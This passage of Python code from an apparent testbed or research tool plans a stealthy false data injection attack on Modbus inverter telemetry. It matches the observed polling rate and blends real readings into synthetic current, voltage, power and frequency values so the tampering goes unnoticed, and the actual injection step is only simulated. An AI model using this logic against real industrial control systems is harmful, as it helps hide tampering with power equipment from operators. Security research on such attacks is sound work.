                    "polling_rate": register_polling_info,
                }

        # Add global polling rate information to the parameters
        if polling_rate_info:
            parameters["_global_polling_rate"] = polling_rate_info
            logging.info(
                f"Detected polling rate: {polling_rate_info.get('average_interval', 'unknown')}s intervals, "
                f"frequency: {polling_rate_info.get('frequency_hz', 'unknown')} Hz"
            )

        logging.info(
            f"Analyzed {len(parameters)} parameters from captured traffic with polling rate detection"
        )
        return parameters

    def _analyze_polling_rate(self, timestamps: List[float]) -> Dict[str, Any]:
        """
        Analyze timestamps to extract polling rate patterns and timing information.
        Enhanced with configurable parameters for rate detection and validation.

        Args:
            timestamps: List of timestamps from captured traffic samples

        Returns:
            Dictionary containing polling rate analysis including intervals, frequency, and patterns
        """
        from controller.settings import (
            MODBUS_RATE_DETECTION_TOLERANCE,
            MODBUS_MIN_INJECTION_INTERVAL,
            MODBUS_MAX_INJECTION_INTERVAL,
        )

        if len(timestamps) < 2:
            return {}

        # Sort timestamps to ensure proper ordering
        sorted_timestamps = sorted(timestamps)

        # Calculate intervals between consecutive timestamps
        intervals = []
        for i in range(1, len(sorted_timestamps)):
            interval = sorted_timestamps[i] - sorted_timestamps[i - 1]
            if interval > 0:  # Only include positive intervals
                intervals.append(interval)

        if not intervals:
            return {}

        # Calculate basic statistics
        average_interval = sum(intervals) / len(intervals)
        min_interval = min(intervals)
        max_interval = max(intervals)
        interval_variance = sum((x - average_interval) ** 2 for x in intervals) / len(
            intervals
        )
        interval_std_dev = math.sqrt(interval_variance)

        # Calculate frequency in Hz
        frequency_hz = 1.0 / average_interval if average_interval > 0 else 0.0

        # Detect polling pattern consistency using configurable tolerance
        # Consider polling "regular" if standard deviation is less than configured tolerance of mean
        is_regular_polling = (
            (interval_std_dev / average_interval) < MODBUS_RATE_DETECTION_TOLERANCE
            if average_interval > 0
            else False
        )

        # Detect common polling rates (round to nearest common interval)
        common_intervals = [0.1, 0.2, 0.5, 1.0, 2.0, 5.0, 10.0, 30.0, 60.0]  # seconds
        closest_common_interval = min(
            common_intervals, key=lambda x: abs(x - average_interval)
        )

        # Check if the detected interval is close to a common one (within 10%)
        is_common_rate = (
            abs(average_interval - closest_common_interval) / closest_common_interval
            < 0.1
        )

        polling_info = {
            "sample_count": len(timestamps),
            "interval_count": len(intervals),
            "average_interval": round(average_interval, 3),
            "min_interval": round(min_interval, 3),
            "max_interval": round(max_interval, 3),
            "interval_std_dev": round(interval_std_dev, 3),
            "frequency_hz": round(frequency_hz, 3),
            "is_regular_polling": is_regular_polling,
            "is_common_rate": is_common_rate,
            "closest_common_interval": closest_common_interval,
            "total_duration": round(sorted_timestamps[-1] - sorted_timestamps[0], 3),
            "intervals": intervals[
                :10
            ],  # Store first 10 intervals for pattern analysis
            "detection_tolerance": MODBUS_RATE_DETECTION_TOLERANCE,
        }

        # Add pattern classification
        if is_regular_polling and is_common_rate:
            polling_info["pattern_type"] = "regular_common"
        elif is_regular_polling:
            polling_info["pattern_type"] = "regular_custom"
        elif is_common_rate:
            polling_info["pattern_type"] = "irregular_common"
        else:
            polling_info["pattern_type"] = "irregular_custom"

        # Add recommended injection rate for FDIA using configurable bounds
        # Use the detected average interval, but clamp to configured bounds
        recommended_rate = max(
            MODBUS_MIN_INJECTION_INTERVAL,
            min(MODBUS_MAX_INJECTION_INTERVAL, average_interval),
        )
        polling_info["recommended_injection_interval"] = round(recommended_rate, 3)
        polling_info["recommended_injection_frequency"] = round(
            1.0 / recommended_rate, 3
        )

        logging.debug(
            f"Polling rate analysis: {average_interval:.3f}s avg interval, "
            f"{frequency_hz:.3f} Hz, pattern: {polling_info['pattern_type']}, "
            f"tolerance: {MODBUS_RATE_DETECTION_TOLERANCE}"
        )

        return polling_info

    def _classify_parameter_type(self, address: int, values: List[float]) -> str:
        """
        Classify the type of parameter based on address and value patterns.
        """
        mean_val = sum(values) / len(values)
        variation = (max(values) - min(values)) / mean_val if mean_val > 0 else 0

        # Classify based on typical inverter parameter ranges
        if 0.1 <= mean_val <= 100 and variation > 0.02:
            return "current"  # Current measurements
        elif 200 <= mean_val <= 1000 and variation < 0.1:
            return "voltage"  # Voltage measurements
        elif 1000 <= mean_val <= 10000:
            return "power"  # Power measurements
        elif 50 <= mean_val <= 70 and variation < 0.01:
            return "frequency"  # Frequency
        elif 20 <= mean_val <= 80:
            return "temperature"  # Temperature
        else:
            return "unknown"

    def calculate_transition_plan(
        self, baseline_data: Dict[str, Any], transition_duration: int = 30
    ) -> List[Dict[str, Any]]:
        """
        Calculate a smooth transition plan from real data to synthetic data.
        Enhanced with sophisticated exponential blending and electrical parameter modeling.

        Args:
            baseline_data: Captured baseline data from listening phase
            transition_duration: Duration of transition in seconds

        Returns:
            List of data points for smooth transition
        """
        logging.info(
            f"Calculating {transition_duration}-second transition plan with enhanced blending"
        )

        transition_points = []
        parameters = baseline_data.get("parameters", {})

        if not parameters:
            logging.warning(
                "No baseline parameters available for transition calculation - generating synthetic-only plan"
            )
            # Generate a synthetic-only transition plan when no baseline data is available
            return self._generate_synthetic_only_transition_plan(transition_duration)

        # Generate transition points at 1-second intervals
        for second in range(transition_duration):
            # Enhanced exponential decay from real (α=1.0) to synthetic (α=0.0)
            # Uses sophisticated exponential transition for smooth blending
            alpha = math.exp(-3 * second / transition_duration)

            transition_point = {
                "timestamp": time.time() + second,
                "alpha": alpha,
                "registers": {},
                "quality": "nominal",
            }

            # Calculate blended values for each parameter with enhanced synthetic generation
            for address, param_info in parameters.items():
                real_value = param_info["latest_value"]
                synthetic_value = self._generate_enhanced_synthetic_value(
                    address, param_info, second
                )

                # Blend: real * alpha + synthetic * (1-alpha)
                blended_value = real_value * alpha + synthetic_value * (1 - alpha)
                transition_point["registers"][address] = round(
                    blended_value, 3
                )  # Higher precision

            transition_points.append(transition_point)

        logging.info(f"Generated {len(transition_points)} enhanced transition points")
        return transition_points

    def _generate_synthetic_only_transition_plan(
        self, transition_duration: int = 30
    ) -> List[Dict[str, Any]]:
        """
        Generate a synthetic-only transition plan when no baseline data is available.

        Args:
            transition_duration: Duration of transition in seconds

        Returns:
            List of synthetic data points for transition
        """
        logging.info(
            f"Generating synthetic-only transition plan for {transition_duration} seconds"
        )

        transition_points = []

        # Define default synthetic register values for common inverter parameters
        default_registers = {
            3000: 8.5,  # DC Current A (Amperes)
            3001: 380.2,  # DC Voltage (Volts)
            3002: 240.1,  # AC Phase Voltage A (Volts)
            3003: 12.3,  # AC Phase Current A (Amperes)
            3004: 2950.0,  # AC Power (Watts)
            3005: 3230.0,  # DC Power (Watts)
            3006: 60.0,  # Frequency (Hz)
            3007: 45.2,  # Temperature (Celsius)
        }

        # Generate transition points at 1-second intervals
        for second in range(transition_duration):
            transition_point = {
                "timestamp": time.time() + second,
                "alpha": 0.0,  # Pure synthetic data
                "registers": {},
                "quality": "synthetic",
            }

            # Generate synthetic values for each register
            for address, base_value in default_registers.items():
                # Create mock parameter info for synthetic generation
                param_info = {
                    "mean": base_value,
                    "latest_value": base_value,
                    "parameter_type": self._classify_parameter_type(
                        address, [base_value]
                    ),
                }

                synthetic_value = self._generate_enhanced_synthetic_value(
                    address, param_info, second
                )
                transition_point["registers"][address] = round(synthetic_value, 3)

            transition_points.append(transition_point)

        logging.info(
            f"Generated {len(transition_points)} synthetic-only transition points"
        )
        return transition_points

    def _generate_synthetic_value(
        self, address: int, param_info: Dict[str, Any], time_offset: int
    ) -> float:
        """
        Generate a synthetic value for a parameter based on its characteristics.

        Args:
            address: Register address
            param_info: Parameter information from analysis
            time_offset: Time offset for generating realistic variations

        Returns:
            Synthetic value for this parameter
        """
        base_value = param_info["mean"]
        param_type = param_info["parameter_type"]

        # Parameter-specific noise and variation patterns
        noise_configs = {
            "current": {
                "base_noise": 0.03,
                "trend_amplitude": 0.15,
                "cycle_period": 240,
            },
            "voltage": {
                "base_noise": 0.005,
                "trend_amplitude": 0.03,
                "cycle_period": 600,
            },
            "power": {"base_noise": 0.02, "trend_amplitude": 0.10, "cycle_period": 300},
            "frequency": {
                "base_noise": 0.001,
                "trend_amplitude": 0.005,
                "cycle_period": 1800,
            },
            "temperature": {
                "base_noise": 0.01,
                "trend_amplitude": 0.05,
                "cycle_period": 900,
            },
            "unknown": {
                "base_noise": 0.02,
                "trend_amplitude": 0.08,
                "cycle_period": 360,
            },
        }

        config = noise_configs.get(param_type, noise_configs["unknown"])

        # Add realistic noise
        noise = random.gauss(0, config["base_noise"])

        # Add slow sinusoidal trend
        trend = config["trend_amplitude"] * math.sin(
            2 * math.pi * time_offset / config["cycle_period"]
        )

        # Add small random walk component
        walk = random.gauss(0, config["base_noise"] * 0.5)

        # Combine components
        synthetic_value = base_value * (1 + noise + trend + walk)

        # Apply realistic bounds based on parameter type
        if param_type == "voltage":
            synthetic_value = max(200, min(800, synthetic_value))
        elif param_type == "current":
            synthetic_value = max(0, min(50, synthetic_value))
        elif param_type == "power":
            synthetic_value = max(0, min(10000, synthetic_value))
        elif param_type == "frequency":
            synthetic_value = max(59.5, min(60.5, synthetic_value))
        elif param_type == "temperature":
            synthetic_value = max(20, min(80, synthetic_value))

        return synthetic_value

    def _generate_enhanced_synthetic_value(
        self, address: int, param_info: Dict[str, Any], time_offset: int
    ) -> float:
        """
        Generate enhanced synthetic value with sophisticated electrical parameter modeling.
        Incorporates advanced logic from StreamAttack for realistic electrical characteristics.

        Args:
            address: Register address
            param_info: Parameter information from analysis
            time_offset: Time offset for generating realistic variations

        Returns:
            Enhanced synthetic value with realistic electrical characteristics
        """
        base_value = param_info["mean"]
        param_type = param_info["parameter_type"]

        # Enhanced parameter-specific configurations based on electrical characteristics
        # Incorporates sophisticated modeling from StreamAttack.py
        enhanced_configs = {
            "current": {
                "base_noise": 0.03,  # ±3% noise (current more variable)
                "trend_amplitude": 0.15,  # ±15% slow trend
                "cycle_period": 240,  # 4-minute cycle
                "bounds": (0, 50),  # Typical current range
                "precision": 3,
            },
            "voltage": {
                "base_noise": 0.005,  # ±0.5% noise (voltage more stable)
                "trend_amplitude": 0.03,  # ±3% slow trend
                "cycle_period": 600,  # 10-minute cycle
                "bounds": (200, 800),  # Typical voltage range
                "precision": 2,
            },
            "power": {
                "base_noise": 0.02,  # ±2% noise
                "trend_amplitude": 0.10,  # ±10% slow trend
                "cycle_period": 300,  # 5-minute cycle
                "bounds": (0, 10000),  # Power range
                "precision": 1,
            },
            "frequency": {
                "base_noise": 0.001,  # ±0.1% noise (very stable)
                "trend_amplitude": 0.005,  # ±0.5% slow trend
                "cycle_period": 1800,  # 30-minute cycle
                "bounds": (59.5, 60.5),  # Tight frequency bounds
                "precision": 3,
            },
            "temperature": {
                "base_noise": 0.01,  # ±1% noise
                "trend_amplitude": 0.05,  # ±5% slow trend
                "cycle_period": 900,  # 15-minute cycle
                "bounds": (20, 80),  # Temperature range
                "precision": 1,
            },
        }

        # Map register addresses to specific electrical parameters (like StreamAttack.py)
        address_to_param = {
            3000: "current",  # DC Current A
            3001: "voltage",  # DC Voltage
            3002: "voltage",  # AC Phase Voltage A
            3003: "current",  # AC Phase Current A
            3004: "power",  # AC Power
            3005: "power",  # DC Power
            3006: "frequency",  # Frequency
            3007: "temperature",  # Temperature
        }

        # Use address-specific mapping if available, otherwise fall back to parameter type
        specific_param = address_to_param.get(address, param_type)
        if specific_param:
            config = enhanced_configs.get(
                specific_param,
                enhanced_configs.get(
                    param_type,
                    {
                        "base_noise": 0.02,
                        "trend_amplitude": 0.08,
                        "cycle_period": 360,
                        "bounds": (0, base_value * 2),
                        "precision": 2,
                    },
                ),
            )
        else:
            config = enhanced_configs.get(
                param_type,
                {
                    "base_noise": 0.02,
                    "trend_amplitude": 0.08,
                    "cycle_period": 360,
                    "bounds": (0, base_value * 2),
                    "precision": 2,
                },
            )

        if base_value == 0:
            return 0.0

        # Enhanced noise generation with realistic electrical characteristics
        noise = random.gauss(0, config["base_noise"])

        # Sophisticated sinusoidal trend with phase variation
        trend = config["trend_amplitude"] * math.sin(
            2 * math.pi * time_offset / config["cycle_period"]
        )

        # Enhanced random walk component for realism
        walk = random.gauss(0, config["base_noise"] * 0.5)

        # Combine components with enhanced blending
        synthetic_value = base_value * (1 + noise + trend + walk)

        # Apply realistic physical bounds with enhanced constraints
        min_bound, max_bound = config["bounds"]
        synthetic_value = max(min_bound, min(max_bound, synthetic_value))

        # Apply precision based on parameter type
        precision = config.get("precision", 2)
        return round(synthetic_value, precision)

    def execute_fdia_attack(self, baseline_data: Dict[str, Any]) -> None:
        """
        Execute False Data Injection Attack using captured baseline and transition plan.
        Enhanced with polling rate matching for stealth and timing accuracy.

        Args:
            baseline_data: Captured baseline data from listening phase
        """
        logging.info(
            "Starting False Data Injection Attack (FDIA) with polling rate matching"
        )

        try:
            # Step 1: Extract polling rate information from baseline data
            polling_rate_info = self._extract_polling_rate_info(baseline_data)

            # Step 2: Calculate transition plan with rate-aware timing
            transition_plan = self.calculate_transition_plan(
                baseline_data, transition_duration=30
            )

            if not transition_plan:
                raise RuntimeError("Failed to generate transition plan")

            # Step 3: Configure the proxy with transition data and polling rate
            logging.info(
                "Configuring proxy with transition data and polling rate matching"
            )

            # Log polling rate information
            if polling_rate_info:
                logging.info(
                    f"Using detected polling rate: {polling_rate_info.get('injection_interval', 'unknown')}s intervals, "
                    f"pattern: {polling_rate_info.get('pattern_type', 'unknown')}"
                )
            else:
                logging.warning("No polling rate detected - using default timing")

            # Step 4: Execute rate-matched FDIA attack
            self._execute_rate_matched_fdia(transition_plan, polling_rate_info)

            logging.info("FDIA attack execution completed")

        except Exception as e:
            logging.error(f"FDIA attack failed: {e}")
            raise

    def _extract_polling_rate_info(
        self, baseline_data: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Extract and consolidate polling rate information from baseline data.

        Args:
            baseline_data: Captured baseline data from listening phase

        Returns:
            Dictionary containing consolidated polling rate information for FDIA timing
        """
        parameters = baseline_data.get("parameters", {})

        # Check for global polling rate first
        global_polling = parameters.get("_global_polling_rate", {})
        if global_polling and global_polling.get("average_interval"):
            return {
                "injection_interval": global_polling.get(
                    "recommended_injection_interval", global_polling["average_interval"]
                ),
                "injection_frequency": global_polling.get(
                    "recommended_injection_frequency",
                    global_polling.get("frequency_hz", 1.0),
                ),
                "pattern_type": global_polling.get("pattern_type", "unknown"),
                "is_regular": global_polling.get("is_regular_polling", False),
                "source": "global_analysis",
            }

        # Fall back to individual register polling rates
        register_rates = []
        for address, param_info in parameters.items():
            if isinstance(address, int) and "polling_rate" in param_info:
                rate_info = param_info["polling_rate"]
                if rate_info and rate_info.get("average_interval"):
                    register_rates.append(rate_info["average_interval"])

        if register_rates:
            # Use the most common interval among registers
            avg_interval = sum(register_rates) / len(register_rates)
            return {
                "injection_interval": round(max(0.1, min(10.0, avg_interval)), 3),
                "injection_frequency": (
                    round(1.0 / avg_interval, 3) if avg_interval > 0 else 1.0
                ),
                "pattern_type": "register_average",
                "is_regular": len(set(round(r, 1) for r in register_rates))
                <= 2,  # Similar rates
                "source": "register_analysis",
            }

        # No polling rate detected - return default
        logging.warning("No polling rate information found in baseline data")
        return {}

    def _execute_rate_matched_fdia(
        self, transition_plan: List[Dict[str, Any]], polling_rate_info: Dict[str, Any]
    ) -> None:
        """
        Execute FDIA attack with rate matching to observed polling patterns.
        Enhanced with configurable parameters for timing control and validation.

        Args:
            transition_plan: The calculated transition plan
            polling_rate_info: Polling rate information for timing control
        """
        from controller.settings import (
            MODBUS_POLLING_RATE_MATCHING_ENABLED,
            MODBUS_DEFAULT_INJECTION_INTERVAL,
            MODBUS_TIMING_ACCURACY_THRESHOLD,
        )

        # Determine injection timing based on configuration
        if (
            MODBUS_POLLING_RATE_MATCHING_ENABLED
            and polling_rate_info
            and polling_rate_info.get("injection_interval")
        ):
            injection_interval = polling_rate_info["injection_interval"]
            logging.info(
                f"Using detected injection interval: {injection_interval}s (rate matching enabled)"
            )
        else:
            injection_interval = MODBUS_DEFAULT_INJECTION_INTERVAL
            if not MODBUS_POLLING_RATE_MATCHING_ENABLED:
                logging.info(
                    f"Using default injection interval: {injection_interval}s (rate matching disabled)"
                )
            else:
                logging.info(
                    f"Using default injection interval: {injection_interval}s (no rate detected)"
                )

        # Execute transition plan with rate-matched timing
        logging.info(
            f"Executing FDIA with {len(transition_plan)} transition points at {injection_interval}s intervals"
        )

        start_time = time.time()
        timing_errors = []

        for i, transition_point in enumerate(transition_plan):
            try:
                # Calculate when this point should be executed
                target_time = start_time + (i * injection_interval)
                current_time = time.time()

                # Wait until it's time for this injection
                if target_time > current_time:
                    sleep_duration = target_time - current_time
                    time.sleep(sleep_duration)

                # Measure timing accuracy
                actual_execution_time = time.time()
                timing_error = abs(actual_execution_time - target_time)
                timing_errors.append(timing_error)

                # Log progress at key milestones
                if i % max(1, len(transition_plan) // 10) == 0:
                    progress_pct = int((i / len(transition_plan)) * 100)
                    avg_timing_error = sum(timing_errors) / len(timing_errors)
                    logging.info(
                        f"FDIA Progress: {progress_pct}% - Point {i+1}/{len(transition_plan)}, "
                        f"Alpha: {transition_point.get('alpha', 0):.3f}, "
                        f"Registers: {len(transition_point.get('registers', {}))}, "
                        f"Avg timing error: {avg_timing_error:.3f}s"
                    )

                # Here would be the actual data injection to the MITM proxy
                # For now, we simulate the injection timing
                self._simulate_data_injection(transition_point, injection_interval)

            except Exception as e:
                logging.warning(f"Failed to execute transition point {i+1}: {e}")
                continue

        # Calculate final timing statistics
        actual_duration = time.time() - start_time
        expected_duration = len(transition_plan) * injection_interval
        timing_accuracy = (
            (1 - abs(actual_duration - expected_duration) / expected_duration) * 100
            if expected_duration > 0
            else 0
        )

        # Calculate average timing error
        avg_timing_error = (
            sum(timing_errors) / len(timing_errors) if timing_errors else 0
        )
        max_timing_error = max(timing_errors) if timing_errors else 0

        # Check if timing meets accuracy threshold
        timing_meets_threshold = avg_timing_error <= MODBUS_TIMING_ACCURACY_THRESHOLD

        logging.info(
            f"FDIA execution completed. Actual duration: {actual_duration:.2f}s, "
            f"Expected: {expected_duration:.2f}s, Timing accuracy: {timing_accuracy:.1f}%"
        )
        logging.info(
            f"Timing statistics: Avg error: {avg_timing_error:.3f}s, Max error: {max_timing_error:.3f}s, "
            f"Meets threshold ({MODBUS_TIMING_ACCURACY_THRESHOLD}s): {timing_meets_threshold}"
        )

        if not timing_meets_threshold:
            logging.warning(
                f"Timing accuracy below threshold. Consider adjusting system load or timing parameters."
            )

    def _simulate_data_injection(
        self, transition_point: Dict[str, Any], injection_interval: float
    ) -> None:
        """
        Simulate data injection for a transition point (placeholder for actual MITM proxy integration).

        Args:
            transition_point: The transition point data to inject
            injection_interval: The timing interval for injection
        """
        # This is a placeholder for actual MITM proxy integration
        # In a real implementation, this would send the transition_point data to the ModbusMITMProxy

        registers = transition_point.get("registers", {})
        alpha = transition_point.get("alpha", 0.0)

        # Log the simulated injection
        logging.debug(
            f"Simulated injection: {len(registers)} registers, alpha={alpha:.3f}, "
            f"interval={injection_interval:.3f}s"
        )

        # Simulate some processing time (realistic for actual proxy operations)
        processing_delay = min(
            0.01, injection_interval * 0.1
        )  # Max 10ms or 10% of interval
        time.sleep(processing_delay)

    def _monitor_fdia_progress(self, transition_plan: List[Dict[str, Any]]) -> None:
        """
        Monitor the progress of the FDIA attack.

        Args:
            transition_plan: The calculated transition plan
        """
        total_duration = len(transition_plan)
        logging.info(f"Monitoring FDIA progress for {total_duration} seconds")

        # Monitor key milestones
        milestones = [0.25, 0.5, 0.75, 1.0]  # 25%, 50%, 75%, 100%

        for milestone in milestones:
            wait_time = int(total_duration * milestone)
            time.sleep(
                wait_time
                - (
                    int(total_duration * milestones[milestones.index(milestone) - 1])
                    if milestone > 0.25
                    else 0
                )
            )

            progress_pct = int(milestone * 100)
            current_point = transition_plan[
                min(wait_time - 1, len(transition_plan) - 1)
            ]

            logging.info(
                f"FDIA Progress: {progress_pct}% - Alpha: {current_point['alpha']:.3f}"
            )

            if milestone == 1.0:
                logging.info(
                    "FDIA transition complete - now injecting fully synthetic data"
                )

    def run_complete_fdia_attack(self) -> None:
        """
        Execute the complete FDIA attack sequence:
        1. Listen and capture baseline traffic
        2. Calculate transition plan
        3. Execute FDIA with smooth transition
        """
        logging.info("Starting complete FDIA attack sequence")

        try:
            # Step 1: Listen and capture baseline data
            logging.info("Phase 1: Capturing baseline Modbus traffic")
            baseline_data = self.listen_and_capture_modbus_traffic(duration_seconds=30)

            if not baseline_data.get("parameters"):
                raise RuntimeError("Failed to capture baseline traffic data")

            # Step 2: Execute FDIA attack
            logging.info("Phase 2: Executing False Data Injection Attack")
            self.execute_fdia_attack(baseline_data)

            logging.info("Complete FDIA attack sequence finished successfully")

        except Exception as e:
            logging.error(f"Complete FDIA attack failed: {e}")
            raise
